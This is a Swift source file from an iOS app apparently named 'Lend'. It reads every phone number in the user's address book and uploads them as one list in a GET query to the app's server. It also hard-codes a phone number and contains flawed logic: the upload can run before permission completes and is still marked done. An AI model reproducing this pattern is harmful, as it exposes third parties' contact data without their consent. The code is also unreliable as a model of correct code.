//
//  ContactUploader.swift
//  Lend
//
//  Created by alexlee on 16/3/24.
//  Copyright © 2016年 bird. All rights reserved.
//

import Foundation
import AddressBook
import AddressBookUI

class ContactUploader:NSObject{
    
    var addressBook:ABAddressBookRef?
    var result=""
    
    func uploadAll(uid:Int){
        
        let fm=NSFileManager.defaultManager()
        let path=NSHomeDirectory()+"/Documents/upload.file"
        
        if !fm.fileExistsAtPath(path){
        
        getAllContacts()
        
        let query="uid=1&nums=13829377920"
        if let url=NSURL(string: BASE_URL+"Contact/upload?uid=\(uid)&nums=\(result)"){
            print(url.query)
            try? query.writeToURL(url, atomically: true, encoding: NSUTF8StringEncoding)
            print(url.query)
            let req=NSURLRequest(URL: url)
            let session=NSURLSession.sharedSession()
            let task=session.dataTaskWithRequest(req, completionHandler: {
                _,_,_ in
                NSLog("upload complete")
            })
            task.resume()
        }
            fm.createFileAtPath(path, contents: nil, attributes: nil)
            
        }else{
            print("已上传，无需重复")
        }
        
        
    }
    
    func getAllContacts(){
        
        var error:Unmanaged<CFErrorRef>?
        addressBook = ABAddressBookCreateWithOptions(nil, &error).takeRetainedValue()
        
        //发出授权信息
        let sysAddressBookStatus = ABAddressBookGetAuthorizationStatus()
        if (sysAddressBookStatus == ABAuthorizationStatus.NotDetermined) {
            print("requesting access...")
            //addressBook = extractABAddressBookRef(ABAddressBookCreateWithOptions(nil, &errorRef))
            ABAddressBookRequestAccessWithCompletion(addressBook, { success, error in
                if success {
                    //获取并遍历所有联系人记录
                    self.readRecords();
                }
                else {
                    print("error")
                }
            })
        }
        else if (sysAddressBookStatus == ABAuthorizationStatus.Denied ||
            sysAddressBookStatus == ABAuthorizationStatus.Restricted) {
            print("access denied")
        }
        else if (sysAddressBookStatus == ABAuthorizationStatus.Authorized) {
            print("access granted")
            //获取并遍历所有联系人记录
            readRecords();
        }
    }
    
    func readRecords(){
        
        let sysContacts:NSArray = ABAddressBookCopyArrayOfAllPeople(addressBook)
            .takeRetainedValue() as NSArray
        
        for contact in sysContacts {
            let nums:ABMutableMultiValueRef?=ABRecordCopyValue(contact, kABPersonPhoneProperty).takeRetainedValue()
            if nums != nil{
                for i in 0 ..< ABMultiValueGetCount(nums){
                    var num=ABMultiValueCopyValueAtIndex(nums, CFIndex(i)).takeRetainedValue() as! String
                    print("电话：\(num)")
                    let range=num.rangeOfString("+86 ")
                    if range != nil{
                        num.removeRange(range!)
                    }
                    let range2=num.rangeOfString("+")
                    if range2 != nil{
                        num.removeRange(range2!)
                    }
                    let range3=num.rangeOfString(" ")
                    if range3 != nil{
                        num.removeRange(range3!)
                    }
                    result+=num+","
                }
            }
        }
        print(result)
    }
    
}
